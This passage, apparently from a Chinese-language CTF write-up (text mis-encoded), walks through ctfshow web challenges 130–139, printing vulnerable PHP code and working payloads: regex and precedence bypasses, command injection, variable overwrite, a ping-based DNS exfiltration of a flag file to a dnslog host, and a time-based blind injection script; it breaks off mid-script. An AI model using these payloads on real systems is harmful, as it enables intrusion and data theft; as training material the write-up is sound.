string">'f'</span><span class="token punctuation">:</span> <span class="token string">'very'</span><span class="token operator">*</span><span class="token number">250000</span><span class="token operator">+</span><span class="token string">'ctfshow'</span><span class="token punctuation">&#125;</span>res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/web_130.png"></p><p>æˆ–è€…ç›´æ¥ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">postf<span class="token operator">=</span>ctfshow<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="web131"><a href="#web131" class="headerlink" title="web131"></a>web131</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&lt;</span>?phperror_reporting<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>highlight_file<span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span><span class="token punctuation">;</span>include<span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>isset<span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    $f <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span>$_POST<span class="token punctuation">[</span><span class="token string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>preg_match<span class="token punctuation">(</span><span class="token string">'/.+?ctfshow/is'</span><span class="token punctuation">,</span> $f<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        die<span class="token punctuation">(</span><span class="token string">'bye!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>stripos<span class="token punctuation">(</span>$f<span class="token punctuation">,</span><span class="token string">'36Dctfshow'</span><span class="token punctuation">)</span> <span class="token operator">==</span><span class="token operator">=</span> FALSE<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        die<span class="token punctuation">(</span><span class="token string">'bye!!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    echo $flag<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æœ¬é¢˜å’Œä¸Šä¸€é¢˜ä¸€æ ·ï¼Œåªéœ€è¦æ”¹ä¸‹è„šæœ¬å³å¯ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://202b9930-2598-4766-801c-940a048c0f4b.challenge.ctf.show/"</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">'f'</span><span class="token punctuation">:</span> <span class="token string">'very'</span><span class="token operator">*</span><span class="token number">250000</span><span class="token operator">+</span><span class="token string">'36Dctfshow'</span><span class="token punctuation">&#125;</span>res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‹¿åˆ°flagï¼š</p><p><img src="/images/web_131.png"></p><h4 id="web132"><a href="#web132" class="headerlink" title="web132"></a>web132</h4><p>æ‰“å¼€å¯ä»¥å…ˆçœ‹åˆ°ä¸€ä¸ªè‹±æ–‡é¡µé¢</p><p><img src="/images/web_132a.png"></p><p>ç„¶åæŸ¥çœ‹robots.txtæ–‡ä»¶ï¼Œå‘ç°æœ‰adminè·¯å¾„</p><p><img src="/images/web_132B.png"></p><p>æ¥åˆ°adminè·¯å¾„</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&lt;</span>?php<span class="token comment">#error_reporting(0);</span>include<span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>highlight_file<span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>isset<span class="token punctuation">(</span>$_GET<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token operator">&amp;</span> isset<span class="token punctuation">(</span>$_GET<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token operator">&amp;</span> isset<span class="token punctuation">(</span>$_GET<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    $username <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span>$_GET<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    $password <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span>$_GET<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    $code <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span>$_GET<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>$code <span class="token operator">==</span><span class="token operator">=</span> mt_rand<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x36D</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token operator">&amp;</span> $password <span class="token operator">==</span><span class="token operator">=</span> $flag <span class="token operator">|</span><span class="token operator">|</span> $username <span class="token operator">==</span><span class="token operator">=</span><span class="token string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>$code <span class="token operator">==</span> <span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            echo $flag<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å› ä¸º&amp;&amp;çš„ä¼˜å…ˆçº§é«˜äº||ï¼Œæ‰€ä»¥åªéœ€è¦æ„é€ å‡º$username===â€adminâ€å’Œä¸‹ä¸€ä¸ªæ¡ä»¶$code==â€™adminâ€™å³å¯<br>payloadï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">?code<span class="token operator">=</span>admin<span class="token operator">&amp;</span>username<span class="token operator">=</span>admin<span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ‹¿åˆ°flag</p><h4 id="web133"><a href="#web133" class="headerlink" title="web133"></a>web133</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&lt;</span>?phperror_reporting<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>highlight_file<span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">//</span>flag<span class="token punctuation">.</span>php<span class="token keyword">if</span><span class="token punctuation">(</span>$F <span class="token operator">=</span> @$_GET<span class="token punctuation">[</span><span class="token string">'F'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>!preg_match<span class="token punctuation">(</span><span class="token string">'/system|nc|wget|exec|passthru|netcat/i'</span><span class="token punctuation">,</span> $F<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token builtin">eval</span><span class="token punctuation">(</span>substr<span class="token punctuation">(</span>$F<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        die<span class="token punctuation">(</span><span class="token string">"6ä¸ªå­—æ¯éƒ½è¿˜ä¸å¤Ÿå‘€?!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>çœ‹äº†ç¾¤ä¸»çš„è§†é¢‘ï¼Œæ‰çŸ¥é“äº†è¯¥é¢˜çš„å§¿åŠ¿ï¼Œé¦–å…ˆåœ¨dnslogè·å–ä¸€ä¸ªå…è´¹çš„åŸŸåï¼Œç„¶åä½¿ç”¨pingå‘½ä»¤å’Œgrepå‘½ä»¤ï¼Œå°†å›æ˜¾å¸¦åˆ°dnslogç½‘ç«™ä¸­ï¼ŒåŒæ—¶åˆ©ç”¨$Få˜é‡ï¼Œpayloadå¦‚ä¸‹ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">?F<span class="token operator">=</span>`$F`<span class="token punctuation">;</span> ping `cat flag<span class="token punctuation">.</span>php <span class="token operator">|</span> grep ctfshow`<span class="token punctuation">.</span>abwso0<span class="token punctuation">.</span>dnslog<span class="token punctuation">.</span>cn<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ‹¿åˆ°flagï¼š<br><img src="/images/web_133.png"></p><h4 id="web134"><a href="#web134" class="headerlink" title="web134"></a>web134</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&lt;</span>?phphighlight_file<span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span><span class="token punctuation">;</span>$key1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>$key2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>isset<span class="token punctuation">(</span>$_GET<span class="token punctuation">[</span><span class="token string">'key1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">|</span><span class="token operator">|</span> isset<span class="token punctuation">(</span>$_GET<span class="token punctuation">[</span><span class="token string">'key2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">|</span><span class="token operator">|</span> isset<span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">'key1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">|</span><span class="token operator">|</span> isset<span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">'key2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    die<span class="token punctuation">(</span><span class="token string">"nonononono"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token decorator annotation punctuation">@parse_str</span><span class="token punctuation">(</span>$_SERVER<span class="token punctuation">[</span><span class="token string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>extract<span class="token punctuation">(</span>$_POST<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>$key1 <span class="token operator">==</span> <span class="token string">'36d'</span> <span class="token operator">&amp;</span><span class="token operator">&amp;</span> $key2 <span class="token operator">==</span> <span class="token string">'36d'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    die<span class="token punctuation">(</span>file_get_contents<span class="token punctuation">(</span><span class="token string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>çœ‹åˆ°parse_strå‡½æ•°å’Œextractå‡½æ•°ï¼Œè¿™é¢˜å¤§æ¦‚å°±ç®—å˜é‡è¦†ç›–å‡½æ•°äº†ï¼ŒåŒæ—¶åˆçœ‹åˆ°äº†$_SERVER[â€˜QUERY_STRINGâ€™]å˜é‡ï¼Œç”±ä¹‹å‰çš„å‡ é¢˜å¯ä»¥çŸ¥é“ä¼šè®²urlä¸­çš„å‚æ•°æ³¨å†Œä¸ºå˜é‡ï¼Œæ‰€æœ‰payloadä¸ºï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">?_POST<span class="token punctuation">[</span>key1<span class="token punctuation">]</span><span class="token operator">=</span>36d<span class="token operator">&amp;</span>_POST<span class="token punctuation">[</span>key2<span class="token punctuation">]</span><span class="token operator">=</span>36d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç„¶åå†å³é”®æŸ¥çœ‹æºä»£ç å°±å¯ä»¥çœ‹åˆ°flagäº†</p><h4 id="web135"><a href="#web135" class="headerlink" title="web135"></a>web135</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&lt;</span>?phperror_reporting<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>highlight_file<span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">//</span>flag<span class="token punctuation">.</span>php<span class="token keyword">if</span><span class="token punctuation">(</span>$F <span class="token operator">=</span> @$_GET<span class="token punctuation">[</span><span class="token string">'F'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>!preg_match<span class="token punctuation">(</span><span class="token string">'/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i'</span><span class="token punctuation">,</span> $F<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token builtin">eval</span><span class="token punctuation">(</span>substr<span class="token punctuation">(</span>$F<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        die<span class="token punctuation">(</span><span class="token string">"å¸ˆå‚…ä»¬å±…ç„¶ç ´è§£äº†å‰é¢çš„ï¼Œé‚£å°±æ¥ä¸€ä¸ªåŠ å¼ºç‰ˆå§"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é¢˜åœ¨133é¢˜çš„åŸºç¡€ä¸Šè¿‡æ»¤äº†æ›´å¤šçš„å‘½ä»¤ï¼Œä½†å‘ç°å¯ä»¥ä½¿ç”¨cpå‘½ä»¤ï¼Œå°†flag.phpå¤åˆ¶åˆ°æˆ‘ä»¬å¯ä»¥è®¿é—®çš„æ–‡ä»¶ï¼Œpayloadï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">?F<span class="token operator">=</span>`$F`<span class="token punctuation">;</span> cp flag<span class="token punctuation">.</span>php <span class="token number">1</span><span class="token punctuation">.</span>txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ‹¿åˆ°flag</p><h4 id="web136"><a href="#web136" class="headerlink" title="web136"></a>web136</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&lt;</span>?phperror_reporting<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>function check<span class="token punctuation">(</span>$x<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>preg_match<span class="token punctuation">(</span><span class="token string">'/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\>|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i'</span><span class="token punctuation">,</span> $x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        die<span class="token punctuation">(</span><span class="token string">'too young too simple sometimes naive!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span>isset<span class="token punctuation">(</span>$_GET<span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    $c<span class="token operator">=</span>$_GET<span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    check<span class="token punctuation">(</span>$c<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">exec</span><span class="token punctuation">(</span>$c<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    highlight_file<span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å‘ç°è¿™é¢˜è¿‡æ»¤äº†å¤§é‡çš„å‡½æ•°ï¼Œçœ‹äº†å…¶ä»–å¸ˆå‚…ä»¬çš„åšå®¢ï¼Œæ‰çŸ¥é“Linuxä¸­è¿˜æœ‰ä¸€ä¸ªteeå‘½ä»¤ã€‚<br>Teeæ˜¯    <a href="https://baike.baidu.com/item/Linux%E5%91%BD%E4%BB%A4/1750369">Linuxå‘½ä»¤</a>    ï¼Œç”¨äºæ˜¾ç¤ºç¨‹åºçš„è¾“å‡ºå¹¶å°†å…¶å¤åˆ¶åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­ã€‚</p><p>ls |tee xxx  å³å°†lså‘½ä»¤çš„ç»“æœè¾“å‡ºåˆ°xxxä¸­ï¼Œæ‰€ä»¥payloadï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">?c<span class="token operator">=</span>ls <span class="token operator">/</span><span class="token operator">|</span>tee jian<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å…ˆæŸ¥çœ‹æ ¹ç›®å½•<br><img src="/images/web_136.png"></p><p>å‘ç°ä¸€ä¸ªç‰¹æ®Šçš„ç›®å½•ï¼Œå†æ¬¡è¯»å–</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">?c<span class="token operator">=</span>nl <span class="token operator">/</span>f149_15_h3r3<span class="token operator">|</span>tee jian<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ‹¿åˆ°flag</p><h4 id="web137"><a href="#web137" class="headerlink" title="web137"></a>web137</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&lt;</span>?phperror_reporting<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>highlight_file<span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">ctfshow</span><span class="token punctuation">&#123;</span>    function __wakeup<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        die<span class="token punctuation">(</span><span class="token string">"private class"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    static function getFlag<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        echo file_get_contents<span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>call_user_func<span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">'ctfshow'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é¢˜è€ƒå¯Ÿçš„æ˜¯ç±»çš„è°ƒç”¨ï¼Œpayloadï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">postctfshow<span class="token operator">=</span>ctfshow<span class="token punctuation">:</span><span class="token punctuation">:</span>getFlag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æŸ¥çœ‹æºä»£ç ï¼Œç›´æ¥æ‹¿åˆ°flag</p><h4 id="web138"><a href="#web138" class="headerlink" title="web138"></a>web138</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&lt;</span>?phperror_reporting<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>highlight_file<span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">ctfshow</span><span class="token punctuation">&#123;</span>    function __wakeup<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        die<span class="token punctuation">(</span><span class="token string">"private class"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    static function getFlag<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        echo file_get_contents<span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span>strripos<span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">'ctfshow'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">":"</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    die<span class="token punctuation">(</span><span class="token string">"private function"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>call_user_func<span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">'ctfshow'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é¢˜åœ¨ä¸Šä¸€é¢˜çš„åŸºç¡€ä¸Šå°†:è¿‡æ»¤äº†ï¼Œç„¶ååˆé‡çœ‹äº†ä¸‹call_user_fun()å‡½æ•°ä¸ä»…å¯ä»¥ä¼ å…¥å­—ç¬¦ä¸²ï¼Œè¿˜å¯ä»¥ä¼ å…¥æ•°ç»„<br><img src="/images/web_138.png"></p><p>æ‰€ä»¥payloadï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">ctfshow<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>ctfshow<span class="token operator">&amp;</span>ctfshow<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>getFlag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å³é”®æŸ¥çœ‹æºä»£ç ï¼Œæ‹¿åˆ°flag</p><h4 id="web139"><a href="#web139" class="headerlink" title="web139"></a>web139</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&lt;</span>?phperror_reporting<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>function check<span class="token punctuation">(</span>$x<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>preg_match<span class="token punctuation">(</span><span class="token string">'/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\>|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i'</span><span class="token punctuation">,</span> $x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        die<span class="token punctuation">(</span><span class="token string">'too young too simple sometimes naive!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span>isset<span class="token punctuation">(</span>$_GET<span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    $c<span class="token operator">=</span>$_GET<span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    check<span class="token punctuation">(</span>$c<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">exec</span><span class="token punctuation">(</span>$c<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    highlight_file<span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é¢˜åœ¨åŸå…ˆçš„é¢˜çš„åŸºç¡€ä¸Šbanæ‰äº†å†™çš„æƒé™ï¼Œç„¶åçœ‹äº†ç¾¤ä¸»çš„è§†é¢‘ï¼Œæ‰çŸ¥é“å¯ä»¥ç”¨æ—¶é—´ç›²æ³¨ï¼Œå…ˆåšäº†å‡ ä¸ªæœ¬åœ°æµ‹è¯•<br><img src="/images/web_139a.png"></p><p><img src="/images/web_139b.png"></p><p>ç„¶åè·Ÿç€æ‰“äº†ä¸€éè„šæœ¬</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://08949c28-a6e5-4d46-aeb7-75076f0c8a20.challenge.ctf.show/?c="</span>payload <span class="token operator">=</span> <span class="token string">"if [ `ls / -1 | awk NR==&#123;&#125; | cut -c &#123;&#125;` == &#123;&#125; ];then sleep 3;fi"</span>result <span class="token operator">=</span> <span class="token string">"++++++++++++++++++"</span>row <span class="token operator">=</span> <span class="token number">7</span>length <span class="token operator">=</span> <span class="token number">48</span>strings <span class="token operator">=</span> <span class="token string">"qwertyuiopasdfghjklzxcvbnm_-0123456789"</span><span class="token comment">#ctfshow&#123;801ba0c2-5fad-4324-9be3-af824df7867a&#125;</span><span class="token keyword">for</span> r <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>row<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> s <span class="token keyword">in</span> strings<span class="token punctuation">:</span>            url1 <span class="token operator">=</span> url <span class="token operator">+</span> payload<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span> c<span class="token punctuation">,</span> s<span class="token punctuation">)</span>            <span class="token comment">#print(url1)</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url1<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">2.5</span><span class="token punctuation">)</span>            <span class="token keyword">except</span><span class="token punctuation">:</span>                result <span class="token operator">+=</span>s                <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>                <span class="token keyword">break</span>        result <span class="token operator">+=</span> <span class="token string">" "</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å‡ºæ¥ä¸€ä¸ªç‰¹æ®Šç›®å½•ï¼Œç„¶åç›´æ¥è¯»å–å®ƒ</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://08949c28-a6e5-4d46-aeb7-75076f0c8a20.challenge.ctf.show/?c="</span>payload <span class="token operator">=</span> <span class="token string">"if [ `cat /f149_15_h3r3 | awk NR==&#123;&#125; | cut -c &#123;&#125;` == 